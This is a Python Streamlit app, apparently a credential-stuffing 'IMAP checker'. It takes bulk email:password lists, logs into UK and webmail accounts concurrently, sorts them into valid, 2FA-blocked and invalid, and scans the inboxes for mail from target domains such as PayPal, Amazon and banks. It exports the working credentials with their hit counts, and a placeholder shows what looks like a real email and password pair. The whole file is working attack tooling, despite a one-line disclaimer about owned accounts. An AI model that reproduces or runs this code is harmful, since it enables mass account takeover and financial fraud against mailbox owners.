# ==================================================
# 🔒 PASSWORD PROTECTION — KEEP AT TOP
# ==================================================
import streamlit as st

APP_PASSWORD = "SpookzChecker9090"

if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.title("🔐 Enter Password")
    st.info("Enter your password to access the IMAP Checker.")
    input_pwd = st.text_input("Password", type="password")
    if st.button("🔑 Login"):
        if input_pwd == APP_PASSWORD:
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("❌ Incorrect password — try again.")
    st.stop()

# ==================================================
# 🇬🇧 UK IMAP CHECKER — Accounts + Target Domain Search + All Neat Captures
# ==================================================

import imaplib
import time
import csv
import re
from io import StringIO
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

# ⚙️ SETTINGS
MAX_WORKERS = 8
TIMEOUT = 15
DELAY_BETWEEN = 0.1
MAX_SCAN_EMAILS = 50  # Scan up to 50 most recent emails

# 🔍 PARSE ACCOUNT LINE
def parse_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    for sep in [":", "|", " "]:
        if sep in line:
            parts = line.split(sep, 1)
            if len(parts) == 2 and "@" in parts[0]:
                return {"email": parts[0].strip(), "password": parts[1].strip()}
    match = re.match(r'^([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)[\s:]+(.+)$', line)
    if match:
        return {"email": match.group(1), "password": match.group(2)}
    return None

# 🔍 PARSE TARGET DOMAIN LINE
def parse_domain_line(line):
    line = line.strip().lower()
    if not line or line.startswith("#") or "." not in line:
        return None
    line = re.sub(r'^https?://', '', line)
    line = re.sub(r'^www\.', '', line)
    line = line.split("/")[0]
    return line

# 📡 UK PROVIDER AUTO-DETECT
def get_imap_server(email):
    domain = email.split("@")[-1].lower()
    servers = {
        "gmail.com": ("imap.gmail.com", 993),
        "outlook.com": ("imap-mail.outlook.com", 993),
        "hotmail.com": ("imap-mail.outlook.com", 993),
        "yahoo.co.uk": ("imap.mail.yahoo.com", 993),
        "yahoo.com": ("imap.mail.yahoo.com", 993),
        "btinternet.com": ("mail.btinternet.com", 993),
        "bt.com": ("mail.btinternet.com", 993),
        "talktalk.net": ("mail.talktalk.net", 993),
        "sky.com": ("imap.sky.com", 993),
        "virginmedia.com": ("imap.virginmedia.com", 993),
        "ntlworld.com": ("imap.ntlworld.com", 993),
        "blueyonder.co.uk": ("imap.blueyonder.co.uk", 993),
        "plus.net": ("imap.plus.net", 993),
        "aol.com": ("imap.aol.com", 993),
        "icloud.com": ("imap.mail.me.com", 993),
    }
    return servers.get(domain, ("imap." + domain, 993))

# 📊 EXTRACT DOMAIN FROM EMAIL
def extract_domain(email_str):
    match = re.search(r'@([a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', str(email_str))
    return match.group(1).lower() if match else None

# 🔎 SCAN INBOX FOR TARGET DOMAINS
def scan_inbox_for_domains(mail, target_domains, max_emails=MAX_SCAN_EMAILS):
    hits = Counter()
    try:
        status, count = mail.select("INBOX", readonly=True)
        if status != "OK":
            return hits
        total = int(count[0])
        if total == 0 or not target_domains:
            return hits
        fetch_count = min(total, max_emails)
        status, data = mail.search(None, "ALL")
        if status != "OK":
            return hits
        id_list = data[0].split()[-fetch_count:]
        for email_id in id_list:
            try:
                status, msg_data = mail.fetch(email_id, "(BODY[HEADER.FIELDS (FROM TO CC)])")
                if status != "OK":
                    continue
                for part in msg_data:
                    if isinstance(part, tuple):
                        headers = part[1].decode("utf-8", errors="ignore")
                        emails_found = re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', headers)
                        for e in emails_found:
                            dom = extract_domain(e)
                            if dom:
                                for target in target_domains:
                                    if target in dom or dom == target:
                                        hits[target] += 1
            except:
                continue
    except:
        pass
    return hits

# 🔒 DETECT 2FA / SECURITY
def check_special_status(err_msg):
    err = str(err_msg).lower()
    if any(k in err for k in ["app password", "2fa", "two-factor", "verification", "suspicious", "unusual", "login attempt", "security check"]):
        return "🔒 2FA / App Password Required"
    if any(k in err for k in ["locked", "disabled", "suspended", "account unavailable", "access denied"]):
        return "🚫 Account Locked/Disabled"
    if any(k in err for k in ["too many", "rate limit", "busy", "try again later"]):
        return "⏳ Rate Limited"
    return None

# 📧 MAIN IMAP CHECK
def check_imap(account, target_domains):
    email = account["email"]
    password = account["password"]
    host, port = get_imap_server(email)
    account_domain = extract_domain(email) or "unknown"

    result = {
        "email": email,
        "password": password,
        "domain": account_domain,
        "status": "UNKNOWN",
        "note": "",
        "inbox_count": 0,
        "domain_hits": {},
        "hit_summary": "",
        "imap_server": host,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S")
    }

    try:
        mail = imaplib.IMAP4_SSL(host, port, timeout=TIMEOUT)
        mail.login(email, password)

        # Get inbox count
        status, count = mail.select("INBOX", readonly=True)
        if status == "OK":
            result["inbox_count"] = int(count[0])

        # Scan for target domains
        if target_domains:
            result["domain_hits"] = scan_inbox_for_domains(mail, target_domains, MAX_SCAN_EMAILS)
            hit_parts = [f"{d}:{c}" for d, c in sorted(result["domain_hits"].items(), key=lambda x:x[1], reverse=True)]
            result["hit_summary"] = ", ".join(hit_parts) if hit_parts else "None"

        mail.logout()
        result["status"] = "✅ VALID"
        result["note"] = f"✅ {result['inbox_count']} emails scanned"

    except imaplib.IMAP4.error as e:
        special = check_special_status(e)
        if special:
            result["status"] = "🔒 2FA / SECURITY"
            result["note"] = special
        elif "authentication" in str(e).lower() or "invalid credentials" in str(e).lower():
            result["status"] = "❌ INVALID"
            result["note"] = "Bad credentials"
        else:
            result["status"] = "❌ FAILED"
            result["note"] = str(e)[:80]

    except TimeoutError:
        result["status"] = "⏱️ TIMEOUT"
        result["note"] = "Server did not respond"

    except Exception as e:
        result["status"] = "❓ UNKNOWN"
        result["note"] = str(e)[:80]

    time.sleep(DELAY_BETWEEN)
    return result

# ==================================================
# 🖥️ PAGE LAYOUT — EXACTLY YOUR SCREENSHOT STYLE
# ==================================================
st.set_page_config(page_title="UK IMAP Checker", layout="wide")
st.title("📧 UK IMAP Checker — Auto-Detect + Inbox Search")
st.markdown("""
Auto-detects: **Virgin Media (ntlworld/blueyonder) • BT • TalkTalk • Sky • Plusnet • Outlook • Yahoo UK • Gmail**  
⚠️ **ONLY for accounts you own or have written permission.**
""")

# --- 📝 SECTION 1: ACCOUNTS INPUT ---
st.subheader("Enter Accounts")
st.caption("Format: `email:password` — one per line")
accounts_text = st.text_area(
    "Accounts",
    height=180,
    placeholder="chrisstone063@btinternet.com:Bamfordeg5\nuser@gmail.com:password123",
    label_visibility="collapsed"
)

# --- 🎯 SECTION 2: TARGET DOMAIN SEARCH ---
st.subheader("🔍 Search Inbox FOR THESE DOMAINS")
st.caption("One per line — leave blank to skip domain search")
domains_text = st.text_area(
    "Target Domains",
    height=120,
    placeholder="paypal.com\namazon.co.uk\nbank.co.uk",
    label_visibility="collapsed"
)

# --- ⚙️ SETTINGS & START ---
st.divider()
col1, col2 = st.columns([3, 1])
with col1:
    max_workers = st.slider("Concurrent Checks", 1, 10, MAX_WORKERS)
with col2:
    start_btn = st.button("🚀 START CHECK", type="primary", use_container_width=True)

# --- 🚀 RUN CHECKS ---
if start_btn:
    # Parse accounts
    accounts = []
    if accounts_text.strip():
        for line in accounts_text.strip().split("\n"):
            acc = parse_line(line)
            if acc: accounts.append(acc)

    # Parse target domains
    target_domains = []
    if domains_text.strip():
        for line in domains_text.strip().split("\n"):
            dom = parse_domain_line(line)
            if dom: target_domains.append(dom)
        target_domains = list(set(target_domains))  # Deduplicate

    if not accounts:
        st.warning("⚠️ Enter at least one account first!")
        st.stop()

    # Status summary
    dom_msg = f" — searching for {len(target_domains)} domain(s)" if target_domains else ""
    st.info(f"Loaded **{len(accounts)}** account(s){dom_msg}")

    # Run checks
    results_data = []
    start_time = time.time()
    progress_bar = st.progress(0)

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(check_imap, acc, target_domains) for acc in accounts]
        for idx, fut in enumerate(as_completed(futures)):
            results_data.append(fut.result())
            progress_bar.progress((idx + 1) / len(accounts))

    # --- 📊 LIVE COUNTERS ---
    valid = [r for r in results_data if "✅ VALID" in r["status"]]
    twofa = [r for r in results_data if "🔒" in r["status"]]
    invalid = [r for r in results_data if "❌ INVALID" in r["status"] or "❌ FAILED" in r["status"]]
    unknown = [r for r in results_data if "❓ UNKNOWN" in r["status"] or "⏱️" in r["status"]]

    st.success(f"✅ Complete — {len(accounts)} accounts in {round(time.time() - start_time, 1)}s")
    c1, c2, c3, c4, c5 = st.columns(5)
    c1.metric("Total", len(results_data))
    c2.metric("✅ Valid", len(valid))
    c3.metric("🔒 2FA", len(twofa))
    c4.metric("❌ Invalid", len(invalid))
    c5.metric("❓ Unknown", len(unknown))

    # --- 📈 DOMAIN BREAKDOWN ---
    st.subheader("📈 Account Domain Breakdown")
    domain_counts = Counter(r["domain"] for r in results_data)
    domain_valid = Counter(r["domain"] for r in valid)
    domain_table = [
        {
            "Domain": d,
            "Total Accounts": c,
            "Valid Accounts": domain_valid.get(d, 0),
            "Hit Rate %": f"{round((domain_valid.get(d,0)/c)*100,1)}%"
        }
        for d, c in sorted(domain_counts.items(), key=lambda x:x[1], reverse=True)
    ]
    st.dataframe(domain_table, use_container_width=True, hide_index=True)

    # --- 🎯 TARGET DOMAIN HITS SUMMARY ---
    if target_domains and valid:
        st.subheader("🎯 Target Domain Hits")
        total_hits = Counter()
        for r in valid:
            for d, cnt in r["domain_hits"].items():
                total_hits[d] += cnt
        if total_hits:
            st.info(f"Found target domains in {sum(1 for r in valid if r['domain_hits'])} accounts")
            hit_table = [{"Domain": d, "Total Emails Found": c} for d, c in sorted(total_hits.items(), key=lambda x:x[1], reverse=True)]
            st.dataframe(hit_table, use_container_width=True, hide_index=True)
        else:
            st.info("No target domains found in scanned inboxes.")

    # --- 📋 FULL RESULTS TABLE ---
    st.subheader("📋 All Results")
    st.dataframe(
        results_data,
        column_config={
            "email": "Email",
            "password": "Password",
            "domain": "Account Domain",
            "status": "Status",
            "note": "Details",
            "inbox_count": "📥 Inbox Emails",
            "hit_summary": "🎯 Target Hits",
            "imap_server": "IMAP Server",
            "checked_at": "Checked At"
        },
        use_container_width=True,
        height=400
    )

    # --- 📥 NEAT EXPORTS ---
    st.subheader("📥 Export Results")
    col_a, col_b, col_c, col_d, col_e = st.columns(5)

    # Full CSV
    csv_full = StringIO()
    writer = csv.DictWriter(csv_full, fieldnames=["email","password","domain","status","note","inbox_count","hit_summary","imap_server","checked_at"])
    writer.writeheader()
    writer.writerows(results_data)
    col_a.download_button("📂 Full CSV", data=csv_full.getvalue(), file_name=f"imap_full_{time.strftime('%Y%m%d_%H%M%S')}.csv", mime="text/csv", type="primary")

    # ✅ Valid Only — Neat Format
    valid_txt = "\n".join([
        f"{r['email']}:{r['password']} | 📥 Inbox: {r['inbox_count']} | 🎯 Hits: {r['hit_summary']} | {r['domain']}"
        for r in valid
    ])
    col_b.download_button("✅ Valid Only", data=valid_txt or "None", file_name=f"imap_valid_{time.strftime('%Y%m%d_%H%M%S')}.txt")

    # 🔒 2FA Only
    twofa_txt = "\n".join([f"{r['email']}:{r['password']} | {r['note']} | {r['domain']}" for r in twofa])
    col_c.download_button("🔒 2FA Only", data=twofa_txt or "None", file_name=f"imap_2fa_{time.strftime('%Y%m%d_%H%M%S')}.txt")

    # ❌ Invalid Only
    invalid_txt = "\n".join([f"{r['email']}:{r['password']} | {r['note']} | {r['domain']}" for r in invalid])
    col_d.download_button("❌ Invalid Only", data=invalid_txt or "None", file_name=f"imap_invalid_{time.strftime('%Y%m%d_%H%M%S')}.txt")

    # ❓ Unknown Only
    unknown_txt = "\n".join([f"{r['email']}:{r['password']} | {r['status']} — {r['note']} | {r['domain']}" for r in unknown])
    col_e.download_button("❓ Unknown Only", data=unknown_txt or "None", file_name=f"imap_unknown_{time.strftime('%Y%m%d_%H%M%S')}.txt")

else:
    st.info("👆 Enter accounts above, add target domains if needed, then click START CHECK.")
